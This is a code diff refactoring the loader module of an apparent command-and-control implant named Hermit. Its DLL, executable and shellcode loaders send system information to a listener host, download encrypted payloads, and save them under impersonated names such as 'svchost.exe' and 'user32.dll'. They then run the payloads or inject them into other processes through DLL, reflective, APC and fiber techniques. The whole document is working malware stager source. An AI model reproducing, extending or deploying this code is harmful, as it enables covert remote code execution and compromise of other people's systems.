@@ -2,36 +2,65 @@
 
 namespace Hermit
 {
-    VOID DLLLoader()
+    State::PSTATE Init()
     {
         // Load modules for dynamac API resolution.
+        HMODULE hNTDLL = LoadLibrary(L"ntdll.dll");
+        if (!hNTDLL)
+        {
+			return nullptr;
+        }
+
         HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
         if (!hWinHTTPDLL)
-            return;
+        {
+			FreeLibrary(hNTDLL);
+            return nullptr;
+        }
+    
+        State::PSTATE pState = new State::STATE;
 
-        Procs::PPROCS pProcs = Procs::FindProcs(hWinHTTPDLL);
-        Crypt::PCRYPT pCrypt = Crypt::InitCrypt(AES_KEY_BASE64_W, AES_IV_BASE64_W);
+		pState->pCrypt				        = Crypt::InitCrypt(AES_KEY_BASE64_W, AES_IV_BASE64_W);
+		// pState->pTeb 				        = NtCurrentTeb();
+		pState->hNTDLL				        = hNTDLL;
+		pState->hWinHTTPDLL			        = hWinHTTPDLL;
+		pState->pProcs 				        = Procs::FindProcs(hNTDLL, hWinHTTPDLL);
+		// pState->pSyscalls			        = Syscalls::FindSyscalls(hNTDLL);
+		pState->lpPayloadType 		        = PAYLOAD_TYPE_W;
+		pState->lpPayloadTechnique 		    = PAYLOAD_TECHNIQUE_W;
+        pState->lpPayloadProcessToInject    = PAYLOAD_PROCESS_TO_INJECT_W;
+		// pState->bIndirectSyscalls	        = bIndirectSyscalls;
+		pState->lpListenerProto 	        = LISTENER_PROTOCOL_W;
+		pState->lpListenerHost 		        = LISTENER_HOST_W;
+		pState->nListenerPort 		        = LISTENER_PORT;
+		pState->lpReqPathDownload 	        = REQUEST_PATH_DOWNLOAD_W;
+		pState->hSession 			        = NULL;
+		pState->hConnect 			        = NULL;
+		pState->hRequest 			        = NULL;
+		// pState->pSocket 			        = NULL;
 
-        HINTERNET hSession = NULL;
-        HINTERNET hConnect = NULL;
-        HINTERNET hRequest = NULL;
-        BOOL bResults = FALSE;
+		// Get system information
+		Handler::GetInitialInfoJSON(pState);
 
-        // Get system information as json.
-        std::wstring wInfoJSON = Handler::GetInitialInfoJSON();
+		Handler::HTTPInit(pState);
+		if (pState->hSession == NULL || pState->hConnect == NULL)
+		{
+			State::Free(pState);
+			return nullptr;
+		}
 
-        System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
-            pProcs,
-            LISTENER_HOST_W,
-            LISTENER_PORT
-        );
-        if (!handlers.hSession || !handlers.hConnect) {
-            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
+        return pState;
+    }
+
+    VOID DLLLoader()
+    {
+        State::PSTATE pState = Init();
+        if (!pState)
+        {
             return;
         }
 
-        hSession = handlers.hSession;
-        hConnect = handlers.hConnect;
+        BOOL bResults = FALSE;
 
         // Set the temp file path
         std::wstring dllFileName = L"user32.dll"; // Impersonate the file name.
@@ -40,19 +69,19 @@ namespace Hermit
 
         // Download a DLL file
         bResults = System::Http::DownloadFile(
-            pProcs,
-            pCrypt,
-            hConnect,
-            LISTENER_HOST_W,
-            LISTENER_PORT,
-            REQUEST_PATH_DOWNLOAD_W,
+            pState->pProcs,
+            pState->pCrypt,
+            pState->hConnect,
+            pState->lpListenerHost,
+            pState->nListenerPort,
+            pState->lpReqPathDownload,
             L"Content-Type: application/json\r\n",
-            wInfoJSON,
+            std::wstring(pState->lpInfoJSON),
             dllPath
         );
         if (!bResults)
         {
-            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
+            State::Free(pState);
             return;
         }
 
@@ -60,50 +89,29 @@ namespace Hermit
         DWORD dwPID;
 
         // Inject DLL
-        if (strcmp(PAYLOAD_TECHNIQUE, "dll-injection") == 0)
+        if (wcscmp(pState->lpPayloadTechnique, L"dll-injection") == 0)
         {
-            dwPID = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS_TO_INJECT));
+            dwPID = System::Process::GetProcessIdByName(pState->lpPayloadProcessToInject);
             Technique::Injection::DLLInjection(dwPID, (LPVOID)dllPath.c_str(), dwDllPathSize);
         }
-        else if (strcmp(PAYLOAD_TECHNIQUE, "reflective-dll-injection") == 0)
+        else if (wcscmp(pState->lpPayloadTechnique, L"reflective-dll-injection") == 0)
         {
             Technique::Injection::ReflectiveDLLInjection(dllPath.c_str(), dwDllPathSize);
         }
 
-        Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
+        State::Free(pState);
         return;
     }
 
     VOID ExecLoader()
     {
-        // Load modules for dynamac API resolution.
-        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
-        if (!hWinHTTPDLL)
-            return;
-
-        Procs::PPROCS pProcs = Procs::FindProcs(hWinHTTPDLL);
-        Crypt::PCRYPT pCrypt = Crypt::InitCrypt(AES_KEY_BASE64_W, AES_IV_BASE64_W);
-
-        HINTERNET hSession = NULL;
-        HINTERNET hConnect = NULL;
-        HINTERNET hRequest = NULL;
-        BOOL bResults = FALSE;
-
-        // Get system information as json.
-        std::wstring wInfoJSON = Handler::GetInitialInfoJSON();
-
-        System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
-            pProcs,
-            LISTENER_HOST_W,
-            LISTENER_PORT
-        );
-        if (!handlers.hSession || !handlers.hConnect) {
-            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
+        State::PSTATE pState = Init();
+        if (!pState)
+        {
             return;
         }
 
-        hSession = handlers.hSession;
-        hConnect = handlers.hConnect;
+        BOOL bResults = FALSE;
 
         // Set the temp file path
         std::wstring execFileName = L"svchost.exe"; // Impersonate the file name.
@@ -111,71 +119,51 @@ namespace Hermit
 
         // Download an executable
         bResults = System::Http::DownloadFile(
-            pProcs,
-            pCrypt,
-            hConnect,
-            LISTENER_HOST_W,
-            LISTENER_PORT,
-            REQUEST_PATH_DOWNLOAD_W,
+            pState->pProcs,
+            pState->pCrypt,
+            pState->hConnect,
+            pState->lpListenerHost,
+            pState->nListenerPort,
+            pState->lpReqPathDownload,
             L"Content-Type: application/json\r\n",
-            wInfoJSON,
+            std::wstring(pState->lpInfoJSON),
             execPath
         );
         if (!bResults)
         {
-            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
+            State::Free(pState);
             return;
         }
 
         // Execute
-        if (strcmp(PAYLOAD_TECHNIQUE, "direct-execution") == 0)
+        if (wcscmp(pState->lpPayloadTechnique, L"direct-execution") == 0)
         {
             System::Process::ExecuteFile(execPath);
         }
 
-        Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
+        State::Free(pState);
         return;
     }
 
     VOID ShellcodeLoader()
     {
-        // Load modules for dynamac API resolution.
-        HMODULE hWinHTTPDLL = LoadLibrary(L"winhttp.dll");
-        if (!hWinHTTPDLL)
-            return;
-
-        Procs::PPROCS pProcs = Procs::FindProcs(hWinHTTPDLL);
-        Crypt::PCRYPT pCrypt = Crypt::InitCrypt(AES_KEY_BASE64_W, AES_IV_BASE64_W);
-
-        HINTERNET hSession = NULL;
-        HINTERNET hConnect = NULL;
-        HINTERNET hRequest = NULL;
-        BOOL bResults = FALSE;
-
-        // Get system information as json.
-        std::wstring wInfoJSON = Handler::GetInitialInfoJSON();
-        std::string sInfoJSON = Utils::Convert::UTF8Encode(wInfoJSON);
-
-        System::Http::WinHttpHandlers handlers = System::Http::InitRequest(
-            pProcs,
-            LISTENER_HOST_W,
-            LISTENER_PORT
-        );
-        if (!handlers.hSession || !handlers.hConnect) {
-            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
+        State::PSTATE pState = Init();
+        if (!pState)
+        {
             return;
         }
 
-        hSession = handlers.hSession;
-        hConnect = handlers.hConnect;
+        BOOL bResults = FALSE;
+
+        std::string sInfoJSON = Utils::Convert::UTF8Encode(std::wstring(pState->lpInfoJSON));
 
         // Download shellcode
         System::Http::WinHttpResponse resp = System::Http::SendRequest(
-            pProcs,
-            hConnect,
-            LISTENER_HOST_W,
-            LISTENER_PORT,
-            REQUEST_PATH_DOWNLOAD_W,
+            pState->pProcs,
+            pState->hConnect,
+            pState->lpListenerHost,
+            pState->nListenerPort,
+            pState->lpReqPathDownload,
             L"POST",
             L"Content-Type: application/json\r\n",
             (LPVOID)sInfoJSON.c_str(),
@@ -183,61 +171,40 @@ namespace Hermit
         );
         if (!resp.bResult || resp.dwStatusCode != 200)
         {
-            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
+            State::Free(pState);
             return;
         }
 
-        hRequest = resp.hRequest;
 
-        // std::vector<BYTE> encBytes = System::Http::ReadResponseBytes(pProcs, hRequest);
-        std::wstring wEnc = System::Http::ReadResponseText(pProcs, hRequest);
+        std::wstring wEnc = System::Http::ReadResponseText(pState->pProcs, resp.hRequest);
         if (wEnc.length() == 0)
         {
-            Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
+            State::Free(pState);
             return;
         }
 
         // Decrypt the data
-        std::vector<BYTE> bytes = Crypt::Decrypt(wEnc, pCrypt->pAES->hKey, pCrypt->pAES->iv);
+        std::vector<BYTE> bytes = Crypt::Decrypt(wEnc, pState->pCrypt->pAES->hKey, pState->pCrypt->pAES->iv);
 
         // Target PID
         DWORD dwPID;
 
         // Inject shellcode
-        if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-injection") == 0)
+        if (wcscmp(pState->lpPayloadTechnique, L"shellcode-injection") == 0)
         {
-            dwPID = System::Process::GetProcessIdByName(TEXT(PAYLOAD_PROCESS_TO_INJECT));
+            dwPID = System::Process::GetProcessIdByName(pState->lpPayloadProcessToInject);
             Technique::Injection::ShellcodeInjection(dwPID, bytes);
         }
-        else if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-execution-via-fibers") == 0)
+        else if (wcscmp(pState->lpPayloadTechnique, L"shellcode-execution-via-fibers") == 0)
         {
             Technique::Injection::ShellcodeExecutionViaFibers(bytes);
         }
-        else if (strcmp(PAYLOAD_TECHNIQUE, "shellcode-execution-via-apc-and-nttestalert") == 0)
+        else if (wcscmp(pState->lpPayloadTechnique, L"shellcode-execution-via-apc-and-nttestalert") == 0)
         {
             Technique::Injection::ShellcodeExecutionViaAPCAndNtTestAlert(bytes);
         }
 
-        Free(hWinHTTPDLL, pProcs, pCrypt, hSession, hConnect, hRequest);
+        State::Free(pState);
         return;
-    }
-
-    VOID Free(
-        HMODULE hWinHTTPDLL,
-        Procs::PPROCS pProcs,
-        Crypt::PCRYPT pCrypt,
-        HINTERNET hSession,
-        HINTERNET hConnect,
-        HINTERNET hRequest
-    ) {
-        System::Http::WinHttpCloseHandles(pProcs, hSession, hConnect, hRequest);
-
-        delete pProcs;
-        
-        Crypt::Cleanup(pCrypt->pAES->hAlg, pCrypt->pAES->hKey, pCrypt->pAES->pbKeyObj);
-        delete pCrypt->pAES;
-        delete pCrypt;
-        
-        FreeLibrary(hWinHTTPDLL);
     }
 }
